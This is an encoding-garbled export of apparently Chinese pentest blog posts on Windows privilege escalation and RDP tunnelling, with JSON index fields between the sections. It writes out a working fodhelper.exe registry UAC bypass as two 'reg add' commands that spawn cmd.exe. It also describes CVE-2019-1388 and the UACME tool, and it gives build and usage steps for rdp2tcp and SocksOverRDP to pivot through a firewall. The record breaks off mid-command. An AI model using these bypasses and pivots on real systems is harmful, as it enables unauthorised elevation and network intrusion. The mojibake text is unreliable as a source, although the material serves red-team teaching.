å¦‚æœç”¨æˆ·ä»¥ç®¡ç†å‘˜æƒé™ç™»é™†ï¼Œä¼šç”Ÿæˆä¸¤ä»½è®¿é—®ä»¤ç‰Œï¼Œä¸€ä»½æ˜¯å®Œæ•´çš„ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œï¼ˆFull Access Tokenï¼‰ï¼Œä¸€ä»½æ˜¯æ ‡å‡†ç”¨æˆ·ä»¤ç‰Œã€‚ä¸€èˆ¬æƒ…å†µä¸‹ä¼šä»¥æ ‡å‡†ç”¨æˆ·æƒé™å¯åŠ¨ Explorer.exe è¿›ç¨‹ã€‚å¦‚æœç”¨æˆ·åŒæ„ï¼Œåˆ™èµ‹äºˆå®Œæ•´ç®¡ç†å‘˜æƒé™è®¿é—®ä»¤ç‰Œè¿›è¡Œæ“ä½œã€‚ 7.1.2 é…ç½® UAC ç­–ç•¥ Win+Rï¼Œè¾“å…¥ gpedit.mscï¼Œæ‰“å¼€ç»„ç­–ç•¥ï¼Œåœ¨ã€Œè®¡ç®—æœºé…ç½® â€“ Windowsè®¾ç½® â€“ å®‰å…¨è®¾ç½® â€“ æœ¬åœ°ç­–ç•¥ â€“ å®‰å…¨é€‰é¡¹ã€ï¼Œå†åœ¨å³ä¾§çª—å£æ‰¾åˆ°ã€Œç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼š ç®¡ç†å‘˜æ‰¹å‡†æ¨¡å¼ä¸­ç®¡ç†å‘˜çš„æå‡æƒé™æç¤ºçš„è¡Œä¸ºã€ï¼Œå¦‚ä¸‹å›¾ï¼š ä¸æç¤ºç›´æ¥æå‡ï¼šå…³é—­ UACï¼Œéœ€è¦æƒé™æ—¶ç›´æ¥æå‡æƒé™ã€‚ åœ¨å®‰å…¨æ¡Œé¢ä¸Šæç¤ºå‡­æ®ï¼šéœ€è¦æƒé™æ—¶åœ¨å®‰å…¨æ¡Œé¢ä¸Šè¾“å…¥ç®¡ç†å‘˜å¯†ç æå‡æƒé™ã€‚ åœ¨å®‰å…¨æ¡Œé¢ä¸ŠåŒæ„æç¤ºï¼šéœ€è¦æƒé™æ—¶åœ¨å®‰å…¨æ¡Œé¢ä¸Šé€‰æ‹©ã€Œå…è®¸ã€æå‡æƒé™ã€‚ æç¤ºå‡­æ®ï¼šéœ€è¦æƒé™æ—¶åœ¨æ™®é€šçª—å£ä¸­è¾“å…¥ç®¡ç†å‘˜å¯†ç æå‡æƒé™ã€‚ åŒæ„æç¤ºï¼šéœ€è¦æƒé™æ—¶åœ¨æ™®é€šçª—å£ä¸­é€‰æ‹©ã€Œå…è®¸ã€æå‡æƒé™ã€‚ é Windows äºŒè¿›åˆ¶æ–‡ä»¶çš„åŒæ„æç¤ºï¼š(é»˜è®¤è®¾ç½®) å½“é Microsoft åº”ç”¨ç¨‹åºçš„æŸä¸ªæ“ä½œéœ€è¦æå‡æƒé™æ—¶ï¼Œé€‰æ‹©ã€Œå…è®¸ã€æå‡æƒé™ã€‚ 7.1.3 æç¤º UAC çš„æƒ…å†µ å› ä¸ºæ™®é€šåº”ç”¨æ‰§è¡Œæƒé™æœ‰é™ï¼ŒæŸäº›æ“ä½œå¿…ç„¶ä¼šè¦æ±‚æ›´é«˜çš„ç®¡ç†å‘˜æƒé™ã€‚æ­¤æ—¶ï¼Œé€šå¸¸å°±éœ€è¦ä¸€ä¸ªæƒé™æå‡çš„æ“ä½œã€‚ç¨‹åºå¯ä»¥å‘ç³»ç»Ÿè¯·æ±‚ææƒï¼Œç³»ç»Ÿä¼šå°†æ­¤è¯·æ±‚é€šè¿‡æä¸€ä¸ªæç¤ºæ¡†ï¼Œè¯·ç”¨æˆ·ç¡®è®¤ã€‚ è§¦å‘ UAC çš„è¡Œä¸ºï¼š é…ç½®Windows Update å¢åŠ æˆ–åˆ é™¤ç”¨æˆ·è´¦æˆ· æ”¹å˜ç”¨æˆ·çš„è´¦æˆ·ç±»å‹ æ”¹å˜ UAC è®¾ç½® å®‰è£… ActiveX å®‰è£…æˆ–ç§»é™¤ç¨‹åº å®‰è£…è®¾å¤‡é©±åŠ¨ç¨‹åº è®¾ç½®å®¶é•¿æ§åˆ¶ å°†æ–‡ä»¶ç§»åŠ¨æˆ–å¤åˆ¶åˆ° Program Files æˆ– Windows ç›®å½• æŸ¥çœ‹å…¶ä»–ç”¨æˆ·æ–‡ä»¶å¤¹ å¦‚æœå½“å‰ç”¨æˆ·çš„ç”¨æˆ·ç»„æƒé™ä¸æ˜¯ç®¡ç†å‘˜ï¼Œææƒæ“ä½œæ˜¯è¦æ±‚è¾“å…¥ç®¡ç†å‘˜å¯†ç çš„ï¼Œè¿™ç‚¹å’Œåœ¨ Linux ä¸­çš„ç›¸åº”æ“ä½œç±»ä¼¼ã€‚ ç¨‹åºåªèƒ½åœ¨è¿è¡Œå‰è¦æ±‚ææƒã€‚å¦‚æœå·²ç»åœ¨è¿è¡Œäº†ï¼Œé‚£ä¹ˆå°†å¤±å»ç”³è¯·ææƒçš„èƒ½åŠ› æƒé™æå‡ä»…å¯¹æ­¤æ¬¡è¿›ç¨‹æœ‰æ•ˆ æå‡æƒé™çš„æ“ä½œå¤§è‡´æœ‰ä¸¤ä¸ªï¼š è‡ªåŠ¨ææƒè¯·æ±‚ æ‰‹åŠ¨ææƒè¯·æ±‚ æ‰‹åŠ¨ææƒå°±æ˜¯ã€Œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œã€ï¼Œè‡ªåŠ¨ææƒè¯·æ±‚å°±æ˜¯ç¨‹åºæœ¬èº«å°±ä¸€è¿è¡Œå°±å¼€å§‹ç”³è¯·æƒé™ï¼Œå¦‚ï¼šæ³¨å†Œè¡¨ç¼–è¾‘å™¨ åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œç¨‹åºå‘˜è‹¥è¦å¼€å‘ä¸€ä¸ªç¨‹åºï¼Œå¯ä»¥åœ¨ç¼–è¯‘å™¨é…ç½®ï¼Œå†™å…¥ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œç”¨äºå‘ç³»ç»Ÿæ ‡è¯†è¯¥åº”ç”¨ç¨‹åºæ˜¯å¿…é¡»è¦ç®¡ç†å‘˜æƒé™è¿è¡Œçš„ã€‚ aslnvoker é»˜è®¤æƒé™ highestAvailable æœ€é«˜æƒé™ requireAdministrator å¿…é¡»æ˜¯ç®¡ç†å‘˜æƒé™ å°†ç¼–è¯‘é€‰é¡¹è°ƒæ•´ä¸º requireAdministratorï¼Œå½“ç”¨æˆ·è¿è¡Œç¨‹åºåï¼Œå°†è·å¾—ç®¡ç†å‘˜æƒé™ä¼šè¯ï¼Œä¸éœ€è¦ç»•è¿‡ UAC äº†ã€‚ manifest ä¸­å…¶å®è¿˜æœ‰å…¶ä»–å±æ€§ï¼Œå¦‚ï¼šautoElevateï¼ˆè‡ªåŠ¨æå‡ï¼‰ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:7:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"7.2 auto Elevate è‡ªåŠ¨æå‡æƒé™åˆ†æ æ‹¥æœ‰è‡ªåŠ¨æƒé™æå‡å±æ€§çš„æ–‡ä»¶ï¼Œä¼šåœ¨å¯åŠ¨æ—¶è‡ªåŠ¨æå‡æƒé™ï¼Œè€Œè¿™äº›åº”ç”¨ç¨‹åºå¾€å¾€éƒ½å…·å¤‡å¾®è½¯çš„ç­¾åï¼Œå¾®è½¯è®¤ä¸ºå®ƒæ˜¯å¯ä¿¡çš„ã€‚æ•…æ­¤ï¼Œåœ¨è¯¥ç¨‹åºå¯åŠ¨æ—¶ï¼Œå°†ä¼šä»¥ç®¡ç†å‘˜èº«ä»½å¯åŠ¨ï¼Œå‡è®¾é€šè¿‡ DLL åŠ«æŒï¼Œä¹Ÿèƒ½è·å¾—ç®¡ç†å‘˜æƒé™ã€‚ ä½†æ˜¯ï¼š å¯èƒ½åˆ†ææˆæœ¬è¾ƒé«˜ å¯èƒ½éœ€è¦é«˜æƒé™æ‰èƒ½å¤Ÿå®Œæˆ 7.2.1 å¯»æ‰¾ auto Elevate https://github.com/g3rzi/Manifesto å¦‚æœä¸Šè¿°ç¨‹åºå­˜åœ¨ DLL åŠ«æŒæ¼æ´ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·å°±å¯ä»¥ç”¨ä½æƒé™ç»•è¿‡ UAC ç¡®è®¤ï¼Œä»¥é«˜æƒé™æ‰§è¡Œä»»æ„ä»£ç ã€‚ 7.2.2 æ‰‹åŠ¨ bypass UAC C:\\Windows\\system32\\odbcad32.exe è¯¥ç¨‹åºç”¨äºé…ç½® ODBC æ•°æ®æºï¼Œä½†æä¾›äº†ä¸€ä¸ªè¾“å…¥ç‚¹ï¼Œé‚£å°±æ˜¯æ–‡ä»¶æµè§ˆå™¨ï¼Œé€šè¿‡æ–‡ä»¶æµè§ˆå™¨æˆ‘ä»¬å¯ä»¥æ‰“å¼€ä¸€ä¸ªç®¡ç†å‘˜æƒé™çš„ Powershellã€‚ è¿˜æœ‰ä¸€ä¸ªç‰¹åˆ«å…¸å‹çš„ä¾‹å­å°±æ˜¯ï¼šCVE-2019-1388 è¯ä¹¦ææƒæ¼æ´ã€‚ é€šè¿‡ç‚¹å‡»ã€Œå±•ç¤ºè¯ä¹¦å‘è¡Œè€…çš„è¯¦ç»†ä¿¡æ¯ã€é“¾æ¥ä¼šè§¦å‘ consent.exe ä»¥ SYSTEM æƒé™æ‰“å¼€æµè§ˆå™¨è®¿é—®æ­¤é“¾æ¥ï¼Œç„¶åæ­¤æµè§ˆå™¨å°±ä¼šæœ‰ SYSTEM æƒé™ã€‚é€šè¿‡ä¿å­˜è¯¥æµè§ˆé¡µé¢ï¼Œä¼šå¼¹å‡ºå¾®è½¯çš„èµ„æºç®¡ç†å™¨ï¼Œåœ¨èµ„æºç®¡ç†å™¨ä¸­é‚®ä»¶æ‰“å¼€ cmd.exe ç¨‹åºï¼Œå°±ä¼šç»§æ‰¿æµè§ˆå™¨çš„ SYSTEM æƒé™ï¼Œç”±æ­¤å°±å®Œæˆäº†ç”±æ™®é€šç”¨æˆ·åˆ° NT AUTHORITY\\SYSTEM ç”¨æˆ·çš„ææƒã€‚ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:7:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"7.3 åˆ©ç”¨æ³¨å†Œè¡¨ bypass UAC ä¸€äº›é«˜æƒé™çš„ç¨‹åºä¼šè°ƒç”¨ HKCR:\\ ä¸‹çš„é”®å€¼ã€‚ æµç¨‹ï¼š é€šè¿‡ä¿®æ”¹ HKCU:\\ ä¸‹é¢çš„é”®å€¼åŒæ­¥ä¿®æ”¹ HKCR:\\ ä¸‹çš„é”®å€¼ã€‚ æŠŠåŸæœ¬çš„é”®å€¼æ”¹ä¸º cmd.exe ç­‰ shell ç¨‹åºã€‚ å¦‚æœé«˜æƒé™çš„ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­è°ƒç”¨æ­¤å¤„è¢«ä¿®æ”¹è¿‡çš„é”®å€¼ï¼Œå°±ä¼šä»¥é«˜æƒé™å¯åŠ¨æˆ‘ä»¬è®¾å®šçš„ç¨‹åºã€‚ å¦‚æ­¤ä¾¿å®ç°äº† Bypass UACã€‚ å¸¸è§çš„æœ‰ï¼ševentvwr.exeã€fodhelper.exeï¼Œä¸‹é¢ä»¥ fodhelper.exe ä¸ºä¾‹ï¼š Pathï¼šC:\\Windows\\system32\\fodhelper.exe REGï¼šHKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Windows\\System32\\cmd.exe /f reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 00000000 /f åœ¨ msf ä¸­å·²ç»é›†æˆäº†ç›¸åº”çš„åˆ©ç”¨æ–¹å¼ã€‚ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:7:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"7.4 UACME å·¥å…·åœ°å€ï¼šhttps://github.com/hfiref0x/UACMEï¼Œå†…å« 60+ ç§ BypassUAC çš„æ–¹æ³• å·¥å…·åˆ—è¡¨å¦‚ä¸‹: Akagi æ˜¯é¡¹ç›®çš„ä¸»ç¨‹åºï¼Œå…¶ä¸­åŒ…å«äº†æ‰€æœ‰çš„ Methodsï¼Œç»•è¿‡ UAC çš„ä¸»è¦æ–¹æ³•çš„æºç éƒ½åœ¨ Method ç›®å½•ä¸‹ï¼Œä¼šä»¥ UAC ç»•è¿‡æ–¹æ³•çš„å‘ç°è€…çš„åå­—æ¥å‘½åæºæ–‡ä»¶ã€‚ clone åˆ°æœ¬åœ°åï¼Œç”¨ VS2019 æ‰“å¼€ï¼Œé€‰æ‹© uacme.vcxprojï¼Œä»¥ Release|x64 å» buildï¼Œç„¶å ctrl+b build é¡¹ç›®ï¼Œç”Ÿæˆçš„é¡¹ç›®åœ¨ source/Akag/output ä¸‹ ä½¿ç”¨ vs2019 æœ¬åœ°ç¼–è¯‘åå¯ä»¥ä½¿ç”¨ akagi32 41 æˆ–è€… akagi64 41 å¯åŠ¨ç¨‹åºï¼Œ41 è¿™ä¸ªæŒ‡çš„æ˜¯ README ä¸­æè¿°çš„æ–¹æ³•ç´¢å¼•ï¼Œè¿è¡Œåå¯ä»¥ç›´æ¥å¾—åˆ°ç®¡ç†å‘˜æƒé™çš„ cmd çª—å£ï¼š ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:7:4","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"8 è‡ªåŠ¨åŒ–æ£€æµ‹ winPEAS å·¥å…·åœ°å€ï¼šhttps://github.com/carlospolop/privilege-escalation-awesome-scripts-suite ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:8:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"9 åœŸè±†ç±»ææƒ åœ¨ã€Œpotato å®¶æ—ææƒåˆ†æã€ä¸­å·²æœ‰ä»‹ç»ï¼Œå†æ¬¡ä¸åšèµ˜è¿°ã€‚ ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:9:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"10 å‚è€ƒ http://www.fuzzysecurity.com/tutorials/16.html https://www.xazlsec.com/index.php/archives/245/ https://at449.com/2020/04/09/2007/ https://www.xazlsec.com/index.php/archives/1164/ é…’ä»™æ¡¥å…­å·éƒ¨é˜Ÿ - çº¢é˜Ÿæµ‹è¯•ä¹‹Windowsææƒå°ç»“ https://3gstudent.github.io/DLLåŠ«æŒæ¼æ´è‡ªåŠ¨åŒ–è¯†åˆ«å·¥å…·Rattleræµ‹è¯•/ https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/ https://payloads.online/archivers/2020-03-02/2 http://blog.leanote.com/post/snowming/ec21a4823438 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:10:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Windows ææƒæ–¹å¼æ€»ç»“","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨æ€è·¯æ•´ç†","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:0:0","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 SocksOverRDP ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:1:0","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.1 å·¥å…·ä»‹ç» å½“é˜²ç«å¢™è§„åˆ™é…ç½®ä¸ºï¼šåªæœ‰ tcp/udp 3389 ç«¯å£å¯ä»¥è¿›è¡Œé€šä¿¡æ—¶ï¼Œå¯ä»¥åˆ©ç”¨ RDP åè®®ï¼Œå»ºç«‹ Socks é€šé“ã€‚åº”ç”¨åœºæ™¯è¾ƒä¸ºæç«¯ã€‚ å·¥å…·åœ°å€ï¼šhttps://github.com/nccgroup/SocksOverRDP æ­¤å·¥å…·åœ¨ RDP åè®®çš„åŸºç¡€ä¸Šå®ç°äº† Socks ä»£ç†åŠŸèƒ½ã€‚ å°±åƒ SSH çš„ -D å‚æ•°ä¸€æ ·ï¼Œåœ¨è¿æ¥åï¼Œåˆ©ç”¨ RDP åè®®å®ç°ä»£ç†åŠŸèƒ½ã€‚ è¯¥å·¥å…·åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼š .dllï¼Œéœ€è¦åœ¨å®¢æˆ·ç«¯ä¸Šè¿›è¡Œæ³¨å†Œï¼Œå¹¶åœ¨æ¯æ¬¡è¿è¡Œæ—¶å°†å…¶åŠ è½½åˆ°è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯çš„ä¸Šä¸‹æ–‡è¿è¡Œç¯å¢ƒä¸­ã€‚ .exeï¼Œå®ƒæ˜¯æœåŠ¡ç«¯ç»„ä»¶ï¼Œéœ€è¦å¤åˆ¶åˆ°æœåŠ¡å™¨å¹¶æ‰§è¡Œã€‚æ— éœ€å®‰è£…ï¼Œæ— éœ€é…ç½®ã€‚ åœ¨è¿œç¨‹æ¡Œé¢è¿æ¥çš„æœåŠ¡å™¨ç«¯æ‰§è¡Œ .exe æ—¶ï¼Œå®ƒä¼šé€šè¿‡åŠ¨æ€è™šæ‹Ÿé€šé“ï¼ˆRDP åè®®çš„ç‰¹æ€§ï¼‰è¿æ¥å›å®¢æˆ·ç«¯ï¼Œå¹¶åœ¨å®¢æˆ·ç«¯å¯åŠ¨ SOCKS ä»£ç†ã€‚è¯¥ä»£ç†é»˜è®¤æƒ…å†µä¸‹ä¾¦å¬ 127.0.0.1:1080ï¼Œå¯ä»¥åœ¨æµè§ˆå™¨æˆ–å·¥å…·ä¸­å°†å…¶é…ç½®ä¸ºä»£ç†ã€‚ ä¿¡æ¯ æœåŠ¡å™¨ä¸Šçš„ç¨‹åºä¸éœ€è¦æœåŠ¡å™¨ç«¯çš„ä»»ä½•ç‰¹æ®Šç‰¹æƒï¼Œè¿˜å…è®¸ä½ç‰¹æƒç”¨æˆ·æ‰“å¼€è™šæ‹Ÿé€šé“å¹¶é€šè¿‡è¿æ¥è¿›è¡Œä»£ç†ã€‚ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:1:1","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.2 å·¥å…·æµ‹è¯• 1.2.1 å®¢æˆ·ç«¯ .dll éœ€è¦æ”¾ç½®åœ¨å®¢æˆ·ç«¯è®¡ç®—æœºä¸Šçš„ä»»ä½•ç›®å½•ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œå¯ä»¥è¯¥æ–‡ä»¶å¤åˆ¶åˆ° ï¼…SYSROOTï¼…\\system32\\ æˆ– ï¼…SYSROOTï¼…\\SysWoW64\\ ç¯å¢ƒå˜é‡ä¸‹ã€‚ ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…æ³¨å†Œè¯¥ DLLï¼š regsvr32.exe SocksOverRDP-Plugin.dll å–æ¶ˆæ³¨å†Œï¼š regsvr32.exe /u SocksOverRDP-Plugin.dll åœ¨ RDP Client ä¸­å¯åŠ¨ mstsc.exe æ—¶å¯ä»¥çœ‹åˆ°å¦‚ä¸‹æç¤ºï¼š 1.2.2 æœåŠ¡ç«¯ ç›´æ¥æ‰§è¡Œï¼šSocksOverRDP-Server.exe å³å¯ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:1:2","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 RDP to TCP ä½¿ç”¨åœºæ™¯ä»ç„¶æ˜¯ï¼šç”±äºé˜²ç«å¢™çš„è®¾ç½®ï¼Œåªèƒ½è¿æ¥ä¸€å° Windows æœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢ï¼Œé‚£ä¹ˆå¦‚ä½•ä»¥è¿™å° Windows æœåŠ¡å™¨ä¸ºè·³æ¿è¿›å…¥å†…ç½‘ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:2:0","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 å·¥å…·ä»‹ç» å·¥å…·åœ°å€ï¼šhttps://github.com/V-E-O/rdp2tcp å·¥å…·åŸç†ï¼šä½¿ç”¨ RDP è™šæ‹Ÿé€šé“åŠŸèƒ½æ¥å¤ç”¨ç«¯å£ å¯ç”¨çš„åŠŸèƒ½ï¼š æ­£å‘ TCP ç«¯å£è½¬å‘ åå‘ TCP ç«¯å£è½¬å‘ å¤„ç†æ ‡å‡†è¾“å…¥/è¾“å‡ºè½¬å‘ SOCKS5 ä»£ç† ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:2:1","tags":["æ¸—é€æµ‹è¯•","RDP"],"title":"çº¢è“å¯¹æŠ—ä¸­ RDP åè®®çš„åˆ©ç”¨","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 å·¥å…·æµ‹è¯• 2.2.1 ä¸‹è½½å¹¶ç¼–è¯‘rdp2tcp å®‰è£… mingw-w64 apt-get install mingw-w64 ä¸‹è½½ rdp2tcp git clone https://github.com/V-E-O/rdp2tcp.git ä¿®æ”¹é…ç½®æ–‡ä»¶ rdp2tcp é»˜è®¤ä¸æ”¯æŒç¼–è¯‘ 64 ä½çš„ exeï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¢åŠ ç¼–è¯‘ 64 ä½ exe çš„é…ç½®ä¿¡æ¯ ä¿®æ”¹æ–‡ä»¶Makefileï¼Œæ–°çš„å†…å®¹å¦‚ä¸‹ï¼š all: client server-mingw64 client: client/rdp2tcp client/rdp2tcp: make -C client #server-mingw32: server/rdp2tcp.exe #server/rdp2tcp.exe: # make -C server -f Makefile.mingw32 server-mingw64: server/rdp2tcp64.exe server/rdp2tcp64.exe: make -C server -f Makefile.mingw64 clean: make -C client clean # make -C server -f Makefile.mingw32 clean make -C server -f Makefile.mingw64 clean make -C tools clean æ–°å»ºæ–‡ä»¶ /server/Makefile.mingw64ï¼Œå†…å®¹å¦‚ä¸‹ï¼š BIN=rdp2tcp64.exe CC=i686-w64-mingw32-gcc CFLAGS=-Wall -g \\ -D_WIN32_WINNT=0x0501 \\ -I../common # -D_WIN32_WINNT=0x0501 # -D_WIN32_WINNT=0x0501 -DDEBUG LDFLAGS=-lwtsapi32 -lws2_32 OBJS= ../common/iobuf.o \\ ../common/print.o \\ ../common/msgparser.o \\ ../common/nethelper.o \\ ../common/netaddr.o \\ errors.o aio.o events.o \\ tunnel.o channel.o process.o commands.o main.o all: clean_common $(BIN) clean_common: $(MAKE) -C ../common clean $(BIN): $(OBJS) $(CC) -o $@ $(OBJS) $(LDFLAGS) %.o: %.c $(CC) $(CFLAGS) -o $@ -c $\u003c clean: rm -f $(OBJS) $(BIN) ç¼–è¯‘ make 2.2.2 ä½¿ç”¨ xfreerdp è¿æ¥è¿œç¨‹æ¡Œé¢å¹¶å»ºç«‹é€šé“ æ‰§è¡Œ xfreerdp å¹¶å¼€å¯ TCP é‡å®šå‘åŠŸèƒ½ /opt/freerdp-nightly/bin/xfreerdp /v:IP:3389 /u:user /p:passwd /cert-ignore /rdp2tcp:/root/rdp2tcp/client/rdp2tcp å°† rdp2tcp64.exe ä¸Šä¼ è‡³ RDP Server å¹¶æ‰§è¡Œ(ä¸éœ€è¦ç®¡ç†å‘˜æƒé™) åœ¨å®¢æˆ·ç«¯ç³»ç»Ÿä¸Šå¯åŠ¨ rdp2tcp.py cd rdp2tcp/tools python rdp2tcp.py æ·»åŠ æ­£å‘ç«¯å£è½¬å‘(æœ¬åœ° 445 -\u003e 192.168.112.129:445)çš„å‘½ä»¤å¦‚ä¸‹ï¼š python 